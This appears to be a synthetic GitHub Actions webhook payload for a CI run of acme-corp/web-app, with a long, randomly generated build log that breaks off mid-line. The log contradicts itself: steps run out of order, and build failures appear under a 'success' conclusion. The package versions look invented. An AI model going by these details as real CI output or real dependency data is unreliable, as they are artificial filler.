{
  "action": "completed",
  "workflow_run": {
    "id": 855,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-813",
    "head_sha": "edb414445159c326217a1beea46fa42eee4debaa",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-24T12:00:35.059127Z",
    "updated_at": "2025-11-24T12:03:27.101102Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_cache_hit (200ms)\n\u2713 test completed\nCache hit for key-1197\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (50MB)\nException: ValueError\n\u2713 build completed\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\n[12:00:35] INFO: Processing request\nInstalling axios@5.13.0\n\u2713 lint completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nStep 10/10: Building\nCompiling src/index.js...\n\u2713 build completed\n  PASS: test_cache_hit (344ms)\nStep 1/10: Building\nFAILED: test_user_create\nInstalling prettier@3.8.0\nCache hit for key-2391\nCache hit for key-7300\nCompiling src/utils.go...\nStep 8/10: Building\n  PASS: test_api_health (354ms)\n\u2713 test completed\n[12:00:35] INFO: Processing request\nInstalling axios@5.4.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling axios@3.20.0\nCompiling src/utils.go...\nInstalling jest@2.20.0\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-9764\n[12:00:35] INFO: Processing request\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-5024\nCompiling src/main.py...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:35] INFO: Processing request\n\u2713 lint completed\nCache hit for key-5644\n  PASS: test_api_health (290ms)\n  PASS: test_api_health (152ms)\n[12:00:35] INFO: Processing request\n\u2713 test completed\n\u2713 build completed\n\u2713 lint completed\n[12:00:35] WARN: Deprecated API usage\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nInstalling jest@3.16.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (31MB)\nStep 1/10: Building\nInstalling express@5.15.0\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/app.ts...\nCache hit for key-8981\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] WARN: Deprecated API usage\nInstalling eslint@2.6.0\nFAILED: test_db_connect\nCompiling src/handler.rs...\n[12:00:35] INFO: Processing request\n[12:00:35] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (280ms)\n[12:00:35] INFO: Processing request\nCache hit for key-3121\nStep 3/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling jest@2.10.0\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nStep 10/10: Building\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nCache hit for key-3020\nStep 2/10: Building\nCache hit for key-2601\nInstalling jest@2.9.0\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nException: ValueError\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (14MB)\nFAILED: test_cache_hit\nStep 7/10: Building\n\u2713 build completed\nInstalling express@2.20.0\nStep 5/10: Building\nStep 5/10: Building\nCache hit for key-4500\nCompiling src/index.js...\nInstalling axios@3.7.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (384ms)\n\u2713 build completed\nStep 6/10: Building\nStep 3/10: Building\n[12:00:35] INFO: Processing request\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (352ms)\nArtifact uploaded: build.tar.gz (26MB)\nWARNING: lodash has known vulnerabilities\n[12:00:35] INFO: Processing request\nStep 1/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 9/10: Building\n\u2717 build failed with exit code 57\nStep 7/10: Building\n  PASS: test_api_health (420ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 build completed\nInstalling webpack@1.3.0\n[12:00:35] WARN: Deprecated API usage\nException: NullPointerException\nWARNING: axios has known vulnerabilities\n  PASS: test_user_create (24ms)\n  PASS: test_user_create (457ms)\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_db_connect (454ms)\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCompiling src/service.java...\nInstalling react@2.9.0\nCompiling src/utils.go...\n\u2713 build completed\nInstalling react@1.11.0\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nCompiling src/service.java...\n\u2713 build completed\n  PASS: test_cache_hit (495ms)\n[12:00:35] INFO: Processing request\nInstalling prettier@1.4.0\nCache hit for key-8523\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (210ms)\n[12:00:35] INFO: Processing request\n=== Step deploy_staging completed ===\n=== Step: unit_tests ===\nCache hit for key-5802\nCache hit for key-6516\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-9828\nCompiling src/utils.go...\nCompiling src/app.ts...\nStep 3/10: Building\n\u2713 build completed\nException: TypeError\nCompiling src/handler.rs...\n  PASS: test_user_create (323ms)\nCache hit for key-3216\n\u2713 build completed\n  PASS: test_db_connect (58ms)\n[12:00:35] INFO: Processing request\nStep 4/10: Building\nCache hit for key-2378\nStep 1/10: Building\nWARNING: eslint has known vulnerabilities\nStep 7/10: Building\n\u2713 build completed\nStep 2/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 test completed\n[12:00:35] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n  PASS: test_api_health (185ms)\n\u2713 test completed\nInstalling jest@5.0.0\nStep 10/10: Building\nCache hit for key-7737\nException: ValueError\n\u2713 test completed\nStep 1/10: Building\nCache hit for key-2748\nCache hit for key-5435\n  PASS: test_user_create (191ms)\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (256ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 build completed\n\u2713 lint completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_auth_login (266ms)\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/index.js...\n[12:00:35] INFO: Processing request\nStep 9/10: Building\n\u2713 test completed\nCache hit for key-3919\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/service.java...\nInstalling express@5.2.0\nCache hit for key-8514\n\u2713 test completed\nStep 2/10: Building\nCache hit for key-1274\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 build completed\nCompiling src/main.py...\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nInstalling jest@1.5.0\n[12:00:35] INFO: Processing request\n\u2717 build failed with exit code 109\nCache hit for key-2989\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (58ms)\nCache hit for key-7907\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_user_create (156ms)\n=== Step unit_tests completed ===\n=== Step: type_check ===\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nStep 5/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_cache_hit (246ms)\n[12:00:35] INFO: Processing request\nWARNING: jest has known vulnerabilities\n  PASS: test_db_connect (90ms)\nArtifact uploaded: build.tar.gz (22MB)\nStep 7/10: Building\n  PASS: test_auth_login (3ms)\nInstalling axios@1.2.0\nArtifact uploaded: build.tar.gz (27MB)\nStep 2/10: Building\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (34MB)\nStep 6/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-5426\n  PASS: test_user_create (356ms)\nCompiling src/main.py...\n\u2713 test completed\n[12:00:35] INFO: Processing request\n\u2713 test completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-9209\n\u2713 lint completed\nCache hit for key-1999\nException: RuntimeError\nCache hit for key-5534\nCompiling src/index.js...\nCompiling src/main.py...\nStep 9/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-3709\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nStep 5/10: Building\nCompiling src/service.java...\nInstalling webpack@1.12.0\nCache hit for key-1410\nCache hit for key-8465\nCache hit for key-9877\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling lodash@4.7.0\n\u2713 test completed\n  PASS: test_user_create (63ms)\n  PASS: test_auth_login (67ms)\n\u2713 lint completed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nInstalling express@2.13.0\n[12:00:35] ERROR: Connection failed\nCache hit for key-6389\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_api_health (201ms)\n  PASS: test_api_health (37ms)\nInstalling jest@1.20.0\nCompiling src/handler.rs...\nInstalling eslint@3.9.0\nCache hit for key-6271\nArtifact uploaded: build.tar.gz (19MB)\nStep 1/10: Building\nInstalling jest@1.4.0\nCache hit for key-2517\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nStep 1/10: Building\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nCache hit for key-1083\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/utils.go...\n[12:00:35] WARN: Deprecated API usage\nStep 1/10: Building\nCompiling src/main.py...\nInstalling axios@5.12.0\nCompiling src/utils.go...\n  PASS: test_user_create (430ms)\n[12:00:35] INFO: Processing request\n=== Step type_check completed ===\n=== Step: integration_tests ===\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-6646\n\u2713 lint completed\nInstalling prettier@2.9.0\n  PASS: test_db_connect (297ms)\nStep 5/10: Building\nCompiling src/app.ts...\nInstalling jest@2.19.0\nCache hit for key-1131\nArtifact uploaded: build.tar.gz (11MB)\nInstalling react@3.11.0\nCache hit for key-4949\nStep 9/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:35] INFO: Processing request\nCache hit for key-9464\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 1/10: Building\n\u2713 lint completed\nStep 7/10: Building\nInstalling express@1.13.0\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-4468\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-4428\n  PASS: test_api_health (176ms)\nStep 2/10: Building\nCache hit for key-9518\nCompiling src/service.java...\nCompiling src/index.js...\nCache hit for key-5760\n  PASS: test_db_connect (102ms)\n\u2717 build failed with exit code 81\nInstalling react@2.14.0\n\u2713 lint completed\nStep 7/10: Building\nCompiling src/main.py...\n\u2713 build completed\nStep 3/10: Building\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\n[12:00:35] INFO: Processing request\n  PASS: test_user_create (182ms)\nStep 5/10: Building\nCompiling src/main.py...\nCache hit for key-9749\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_user_create (389ms)\nStep 3/10: Building\n\u2713 test completed\nInstalling eslint@4.8.0\n  PASS: test_cache_hit (139ms)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling prettier@1.16.0\nInstalling eslint@3.0.0\n[12:00:35] INFO: Processing request\n[12:00:35] ERROR: Connection failed\n\u2713 lint completed\nCompiling src/service.java...\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (2MB)\nException: NullPointerException\n  PASS: test_user_create (370ms)\nCache hit for key-6095\n  PASS: test_auth_login (335ms)\nCompiling src/service.java...\n  PASS: test_db_connect (416ms)\nException: TypeError\n[12:00:35] ERROR: Connection failed\nException: TypeError\nStep 2/10: Building\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (357ms)\n  PASS: test_db_connect (163ms)\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n  PASS: test_api_health (391ms)\nStep 10/10: Building\n  PASS: test_db_connect (490ms)\n  PASS: test_db_connect (48ms)\nArtifact uploaded: build.tar.gz (25MB)\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\nStep 3/10: Building\nCache hit for key-7150\n[12:00:35] INFO: Processing request\nInstalling express@4.6.0\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/service.java...\nStep 9/10: Building\n\u2717 build failed with exit code 17\nCompiling src/service.java...\n\u2713 test completed\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-7107\nCache hit for key-9549\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (282ms)\nInstalling eslint@4.7.0\n[12:00:35] WARN: Deprecated API usage\n  PASS: test_user_create (387ms)\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_db_connect (59ms)\n[12:00:35] ERROR: Connection failed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nInstalling jest@4.15.0\n[12:00:35] INFO: Processing request\nInstalling express@4.13.0\nWARNING: axios has known vulnerabilities\nInstalling axios@4.4.0\nCache hit for key-1953\nCache hit for key-3046\nCache hit for key-7988\n[12:00:35] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (19MB)\nInstalling lodash@3.17.0\n  PASS: test_user_create (399ms)\n[12:00:35] WARN: Deprecated API usage\nCompiling src/main.py...\n\u2713 build completed\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nStep 10/10: Building\nStep 9/10: Building\n[12:00:35] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nCache hit for key-4603\n\u2713 test completed\nCompiling src/utils.go...\n  PASS: test_cache_hit (67ms)\nStep 7/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\nCompiling src/service.java...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:35] INFO: Processing request\nCache hit for key-5439\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (239ms)\nInstalling webpack@4.19.0\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (288ms)\nFAILED: test_auth_login\n  PASS: test_auth_login (472ms)\nInstalling eslint@5.10.0\n\u2717 build failed with exit code 34\nInstalling react@2.7.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-1495\n\u2713 lint completed\n=== Step deploy_production completed ===\n=== Step: setup_environment ===\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-8127\nStep 7/10: Building\n\u2713 test completed\nInstalling eslint@4.1.0\n  PASS: test_db_connect (49ms)\n\u2713 build completed\n[12:00:35] INFO: Processing request\nFAILED: test_db_connect\nInstalling lodash@5.11.0\nInstalling eslint@2.11.0\nInstalling webpack@4.4.0\n  PASS: test_db_connect (349ms)\n  PASS: test_user_create (44ms)\nCompiling src/index.js...\nCache hit for key-8941\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-5691\n  PASS: test_db_connect (371ms)\n[12:00:35] WARN: Deprecated API usage\nCache hit for key-4166\nCompiling src/service.java...\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-1317\n[12:00:35] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_api_health (240ms)\n\u2713 lint completed\nCompiling src/main.py...\n  PASS: test_user_create (369ms)\n  PASS: test_auth_login (68ms)\nInstalling express@4.11.0\nFAILED: test_api_health\n\u2713 test completed\n  PASS: test_db_connect (14ms)\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\nCache hit for key-2836\n  PASS: test_cache_hit (107ms)\nInstalling react@3.1.0\n\u2713 lint completed\nCache hit for key-5940\n  PASS: test_user_create (351ms)\nInstalling webpack@5.11.0\n[12:00:35] WARN: Deprecated API usage\nStep 7/10: Building\n[12:00:35] INFO: Processing request\nCache hit for key-1747\n\u2713 build completed\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 8/10: Building\nStep 6/10: Building\nCache hit for key-2877\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_db_connect (298ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-8435\n\u2713 lint completed\n  PASS: test_auth_login (148ms)\n\u2713 build completed\n[12:00:35] INFO: Processing request\nCache hit for key-6620\nStep 6/10: Building\nStep 8/10: Building\n[12:00:35] INFO: Processing request\nInstalling prettier@1.4.0\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (383ms)\n  PASS: test_user_create (187ms)\n  PASS: test_cache_hit (326ms)\nCompiling src/main.py...\n\u2713 test completed\n  PASS: test_auth_login (198ms)\nCache hit for key-8986\n\u2717 build failed with exit code 74\nStep 8/10: Building\nStep 10/10: Building\n\u2713 build completed\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-7373\n\u2713 lint completed\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\n[12:00:35] INFO: Processing request\nStep 5/10: Building\nCompiling src/handler.rs...\n  PASS: test_auth_login (293ms)\n\u2713 lint completed\nInstalling jest@1.11.0\n  PASS: test_user_create (155ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n  PASS: test_auth_login (394ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling express@1.17.0\nCompiling src/utils.go...\n[12:00:35] INFO: Processing request\nCache hit for key-7141\n\u2713 test completed\n  PASS: test_user_create (266ms)\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\nFAILED: test_db_connect\nCompiling src/handler.rs...\n  PASS: test_cache_hit (395ms)\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nCompiling src/index.js...\nCache hit for key-4247\n[12:00:35] INFO: Processing request\nInstalling webpack@5.11.0\n  PASS: test_auth_login (268ms)\n  PASS: test_user_create (353ms)\nStep 8/10: Building\nException: ValueError\nCache hit for key-9682\n  PASS: test_auth_login (244ms)\nException: TypeError\nInstalling express@2.18.0\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (278ms)\n[12:00:35] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/app.ts...\n  PASS: test_db_connect (214ms)\nInstalling lodash@1.2.0\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_api_health (415ms)\nStep 6/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/utils.go...\n\u2713 lint completed\nStep 4/10: Building\nStep 4/10: Building\nInstalling react@3.8.0\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-5582\nFAILED: test_auth_login\nInstalling lodash@3.9.0\nStep 10/10: Building\nInstalling eslint@2.12.0\n\u2713 build completed\n[12:00:35] INFO: Processing request\nStep 7/10: Building\nStep 2/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nInstalling express@3.13.0\nStep 2/10: Building\nInstalling express@2.4.0\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nInstalling jest@3.9.0\n  PASS: test_cache_hit (317ms)\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u2713 lint completed\n[12:00:35] INFO: Processing request\nStep 7/10: Building\nCache hit for key-2392\n\u2713 test completed\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nCompiling src/utils.go...\nCompiling src/main.py...\n  PASS: test_api_health (158ms)\nCache hit for key-7833\n  PASS: test_auth_login (116ms)\nStep 7/10: Building\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_user_create (79ms)\nCompiling src/index.js...\nStep 1/10: Building\nInstalling webpack@2.19.0\n  PASS: test_auth_login (333ms)\nCompiling src/service.java...\n[12:00:35] INFO: Processing request\nStep 3/10: Building\n\u2713 test completed\nInstalling react@2.18.0\nArtifact uploaded: build.tar.gz (45MB)\nStep 3/10: Building\nCache hit for key-2787\n  PASS: test_user_create (142ms)\n[12:00:35] ERROR: Connection failed\n  PASS: test_api_health (400ms)\n\u2713 test completed\nStep 3/10: Building\nInstalling axios@3.12.0\nInstalling express@5.3.0\n[12:00:35] INFO: Processing request\nStep 3/10: Building\n[12:00:35] WARN: Deprecated API usage\nInstalling jest@4.4.0\nCompiling src/app.ts...\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nInstalling prettier@1.9.0\n[12:00:35] INFO: Processing request\nCompiling src/service.java...\nStep 6/10: Building\nException: TypeError\nStep 9/10: Building\nCache hit for key-9581\nStep 2/10: Building\n[12:00:35] INFO: Processing request\nStep 6/10: Building\nCache hit for key-3821\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@5.4.0\nInstalling prettier@3.9.0\n  PASS: test_user_create (313ms)\n  PASS: test_user_create (252ms)\n[12:00:35] INFO: Processing request\n[12:00:35] ERROR: Connection failed\n  PASS: test_cache_hit (262ms)\nStep 7/10: Building\nCache hit for key-1807\nCompiling src/service.java...\nCompiling src/index.js...\nStep 5/10: Building\n  PASS: test_api_health (345ms)\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:35] INFO: Processing request\n\u2713 test completed\n\u2713 build completed\n  PASS: test_auth_login (28ms)\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-6612\n[12:00:35] INFO: Processing request\n[12:00:35] WARN: Deprecated API usage\nCompiling src/handler.rs...\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-3341\n\u2713 lint completed\nCache hit for key-5479\nCache hit for key-2659\n\u2713 build completed\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nStep 8/10: Building\nInstalling express@5.10.0\n[12:00:35] WARN: Deprecated API usage\nCompiling src/utils.go...\n=== Step setup_node completed ===\n=== Step: checkout ===\n  PASS: test_auth_login (288ms)\n  PASS: test_db_connect (402ms)\nArtifact uploaded: build.tar.gz (49MB)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/index.js...\nInstalling axios@1.8.0\nCache hit for key-6710\n  PASS: test_user_create (425ms)\nCompiling src/service.java...\nStep 4/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 lint completed\nStep 3/10: Building\nStep 2/10: Building\n\u2713 test completed\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (144ms)\nStep 2/10: Building\nCache hit for key-4013\nStep 2/10: Building\n  PASS: test_auth_login (15ms)\n[12:00:35] ERROR: Connection failed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (18MB)\nStep 5/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_auth_login (252ms)\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (281ms)\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] WARN: Deprecated API usage\n[12:00:35] INFO: Processing request\n  PASS: test_api_health (267ms)\n\u2713 test completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (20MB)\nStep 10/10: Building\n\u2713 lint completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/handler.rs...\n\u2713 test completed\n\u2713 lint completed\nWARNING: express has known vulnerabilities\nInstalling axios@1.0.0\n  PASS: test_user_create (87ms)\n[12:00:35] INFO: Processing request\nCompiling src/app.ts...\nInstalling prettier@2.19.0\nCompiling src/main.py...\nInstalling prettier@1.18.0\nCache hit for key-1139\nStep 5/10: Building\nCompiling src/handler.rs...\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\n  PASS: test_user_create (3ms)\nCache hit for key-1335\n\u2717 build failed with exit code 8\nCache hit for key-7725\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_cache_hit (108ms)\nCache hit for key-6109\n[12:00:35] INFO: Processing request\nCache hit for key-7726\nStep 4/10: Building\n\u2717 build failed with exit code 108\n  PASS: test_auth_login (229ms)\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nInstalling webpack@4.5.0\n\u2713 build completed\nCompiling src/service.java...\n\u2713 test completed\n\u2713 build completed\nCache hit for key-5594\n[12:00:35] INFO: Processing request\n=== Step checkout completed ===\n=== Step: install_dependencies ===\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_cache_hit (377ms)\nInstalling eslint@2.4.0\nInstalling jest@2.0.0\nStep 7/10: Building\n[12:00:35] ERROR: Connection failed\nException: NullPointerException\n\u2713 build completed\n[12:00:35] WARN: Deprecated API usage\n\u2713 test completed\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\n[12:00:35] INFO: Processing request\nException: ValueError\nCompiling src/utils.go...\n  PASS: test_cache_hit (311ms)\n  PASS: test_db_connect (382ms)\nInstalling eslint@3.0.0\n  PASS: test_auth_login (203ms)\n[12:00:35] INFO: Processing request\n  PASS: test_cache_hit (288ms)\nCompiling src/handler.rs...\nInstalling express@4.1.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 test completed\nInstalling jest@1.7.0\n[12:00:35] INFO: Processing request\nException: RuntimeError\nInstalling lodash@4.2.0\n[12:00:35] INFO: Processing request\n[12:00:35] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nInstalling prettier@5.4.0\nInstalling prettier@2.17.0\n\u2713 lint completed\nInstalling jest@1.17.0\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (21MB)\nInstalling express@2.16.0\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (20MB)\nInstalling react@1.13.0\nInstalling react@1.18.0\n[12:00:35] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-6405\n  PASS: test_cache_hit (215ms)\nStep 3/10: Building\nInstalling lodash@2.12.0\nCache hit for key-2437\nCache hit for key-4401\nInstalling express@3.17.0\nCache hit for key-6726\n\u2713 lint completed\nInstalling react@2.14.0\nInstalling react@5.9.0\nCache hit for key-4844\n\u2713 lint completed\n  PASS: test_user_create (414ms)\n[12:00:35] WARN: Deprecated API usage\nInstalling jest@4.7.0\nException: ValueError\nInstalling axios@3.13.0\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (6MB)\nInstalling jest@1.19.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (6MB)\nStep 8/10: Building\n  PASS: test_user_create (483ms)\n[12:00:35] ERROR: Connection failed\n[12:00:35] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/app.ts...\nCompiling src/service.java...\nInstalling eslint@2.18.0\nCompiling 